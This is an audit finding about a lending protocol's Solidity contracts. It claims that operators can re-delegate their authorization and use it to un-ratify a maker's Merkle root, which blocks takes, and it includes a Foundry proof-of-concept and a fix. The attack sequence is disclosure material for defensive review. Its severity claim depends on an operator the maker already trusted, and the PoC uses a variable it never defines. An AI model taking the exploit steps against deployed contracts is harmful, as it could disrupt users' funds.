### Title
Transitive Authorization Delegation Allows Any Authorized Operator to Freeze Maker's Offer Tree via SetterRatifier - (File: src/ratifiers/interfaces/ISetterRatifier.sol)

### Summary
`Midnight.setIsAuthorized` permits any already-authorized operator to grant full maker-level authorization to an arbitrary third party on behalf of the maker, with no scoping by action or contract. Because `SetterRatifier.setIsRootRatified` accepts any address that passes `isAuthorized[maker][msg.sender]`, a two-hop delegation chain lets an unprivileged `operatorB` — who was never directly authorized by the maker — set `isRootRatified[maker][root] = false`, causing every subsequent `take` against that root to revert with `NotRatified`.

### Finding Description

**Code path — `Midnight.setIsAuthorized`:**

```solidity
// src/Midnight.sol:731-734
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    ...
}
``` [1](#0-0) 

The guard is a flat boolean: any address for which `isAuthorized[onBehalf][msg.sender] == true` may write `isAuthorized[onBehalf][<anyone>]`. There is no restriction preventing an operator from re-delegating the same privilege it holds.

This is not an edge case — the existing test suite explicitly asserts it as working behavior:

```solidity
// test/AuthorizationTest.sol:297-303
vm.prank(user);
midnight.setIsAuthorized(authorized, true, user);   // hop 1

vm.prank(authorized);
midnight.setIsAuthorized(newAuthorized, true, user); // hop 2 — succeeds

assertEq(midnight.isAuthorized(user, newAuthorized), true);
``` [2](#0-1) 

**Code path — `SetterRatifier.setIsRootRatified`:**

```solidity
// src/ratifiers/SetterRatifier.sol:24-28
function setIsRootRatified(address maker, bytes32 root, bool newIsRootRatified) public {
    require(maker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(maker, msg.sender), Unauthorized());
    isRootRatified[maker][root] = newIsRootRatified;
    ...
}
``` [3](#0-2) 

The guard is identical in structure: any address satisfying `isAuthorized[maker][msg.sender]` may write `isRootRatified[maker][root]` to any value, including `false`.

**`isRatified` enforcement:**

```solidity
// src/ratifiers/SetterRatifier.sol:35
require(isRootRatified[offer.maker][root], NotRatified());
``` [4](#0-3) 

Once `isRootRatified[maker][root]` is `false`, every `midnight.take` that supplies this root as ratifier data reverts unconditionally.

**Full exploit flow:**

| Step | Caller | Call | State change |
|------|--------|------|--------------|
| 1 | `maker` | `midnight.setIsAuthorized(operatorA, true, maker)` | `isAuthorized[maker][operatorA] = true` |
| 2 | `operatorA` | `midnight.setIsAuthorized(operatorB, true, maker)` | `isAuthorized[maker][operatorB] = true` — passes because `isAuthorized[maker][operatorA]` is true |
| 3 | `operatorB` | `setterRatifier.setIsRootRatified(maker, root, false)` | `isRootRatified[maker][root] = false` — passes because `isAuthorized[maker][operatorB]` is true |
| 4 | anyone | `midnight.take(offer, ...)` | reverts `NotRatified` |

No existing check stops step 2: `setIsAuthorized` does not distinguish between "grant to self" and "re-delegate to a third party", and there is no depth limit, allowlist, or action scope on the authorization.

### Impact Explanation
All offers whose `ratifier` is `SetterRatifier` and whose Merkle root has been frozen become permanently un-takeable until the maker (or another still-authorized operator) calls `setIsRootRatified(maker, root, true)` again. If `operatorA` is a smart contract with a publicly callable path that invokes `setIsAuthorized`, any unprivileged user can execute the full chain and freeze every active offer tree the maker has ratified through `SetterRatifier`, halting all lending/borrowing activity for that maker. [5](#0-4) 

### Likelihood Explanation
**Preconditions:**
1. Maker has at least one offer tree ratified via `SetterRatifier`.
2. Maker has authorized at least one operator (`operatorA`) — a common pattern used throughout the test suite (e.g., authorizing `midnightBundles`, `ecrecoverRatifier`, vault contracts).
3. `operatorA` is a contract with any externally callable function that triggers `midnight.setIsAuthorized(operatorB, true, maker)` — or `operatorA` is itself malicious.

Condition 2 is the normal operating mode for any maker using peripheral contracts. The attack is repeatable: even if the maker re-ratifies the root, `operatorB` can immediately freeze it again as long as `isAuthorized[maker][operatorB]` remains `true`. [1](#0-0) 

### Recommendation
Restrict `setIsAuthorized` so that only the principal (`onBehalf == msg.sender`) may grant new authorizations; authorized operators may act on behalf of the principal but may not extend that authorization to further parties:

```solidity
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender, Unauthorized()); // remove operator re-delegation
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    ...
}
```

If operator-initiated delegation is intentionally required for some use cases, introduce a separate, explicitly scoped permission (e.g., `canDelegate`) that must be separately granted, so makers can authorize operators for execution without implicitly granting them the power to extend authorization chains. [6](#0-5) 

### Proof of Concept

```solidity
// Foundry unit test
function testTransitiveDelegationFreezesRoot() public {
    address maker     = makeAddr("maker");
    address operatorA = makeAddr("operatorA");
    address operatorB = makeAddr("operatorB");

    // Setup: maker creates and ratifies a root via SetterRatifier
    bytes32 root = keccak256("offerRoot");
    vm.prank(maker);
    setterRatifier.setIsRootRatified(maker, root, true);
    assertTrue(setterRatifier.isRootRatified(maker, root));

    // Step 1: maker authorizes operatorA
    vm.prank(maker);
    midnight.setIsAuthorized(operatorA, true, maker);

    // Step 2: operatorA re-delegates to operatorB (no maker involvement)
    vm.prank(operatorA);
    midnight.setIsAuthorized(operatorB, true, maker);

    // Assert: operatorB is now fully authorized as maker
    assertTrue(midnight.isAuthorized(maker, operatorB));

    // Step 3: operatorB freezes the root
    vm.prank(operatorB);
    setterRatifier.setIsRootRatified(maker, root, false);

    // Assert: root is frozen
    assertFalse(setterRatifier.isRootRatified(maker, root));

    // Step 4: any take against this root now reverts NotRatified
    vm.prank(address(midnight));
    vm.expectRevert(ISetterRatifier.NotRatified.selector);
    setterRatifier.isRatified(offer, abi.encode(root, 0, new bytes32[](0)));
}
```

Expected assertions: all four `assert*` calls pass; the final `expectRevert` confirms the offer tree is frozen. [7](#0-6)

### Citations

**File:** src/Midnight.sol (L731-735)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
    }
```

**File:** test/AuthorizationTest.sol (L297-303)
```text
        vm.prank(user);
        midnight.setIsAuthorized(authorized, true, user);

        vm.prank(authorized);
        midnight.setIsAuthorized(newAuthorized, true, user);

        assertEq(midnight.isAuthorized(user, newAuthorized), true);
```

**File:** src/ratifiers/SetterRatifier.sol (L24-28)
```text
    function setIsRootRatified(address maker, bytes32 root, bool newIsRootRatified) public {
        require(maker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(maker, msg.sender), Unauthorized());
        isRootRatified[maker][root] = newIsRootRatified;
        emit SetIsRootRatified(msg.sender, maker, root, newIsRootRatified);
    }
```

**File:** src/ratifiers/SetterRatifier.sol (L30-36)
```text
    function isRatified(Offer memory offer, bytes memory ratifierData) external view returns (bytes32) {
        require(msg.sender == MIDNIGHT, NotMidnight());
        (bytes32 root, uint256 leafIndex, bytes32[] memory proof) =
            abi.decode(ratifierData, (bytes32, uint256, bytes32[]));
        require(HashLib.isLeaf(root, HashLib.hashOffer(offer), leafIndex, proof), InvalidProof());
        require(isRootRatified[offer.maker][root], NotRatified());
        return CALLBACK_SUCCESS;
```

**File:** test/SetterRatifierTest.sol (L111-117)
```text
    function testSetIsRootRatifiedUnauthorizedOnBehalf() public {
        bytes32 _root = keccak256("root");

        vm.prank(borrower);
        vm.expectRevert(ISetterRatifier.Unauthorized.selector);
        setterRatifier.setIsRootRatified(lender, _root, true);
    }
```
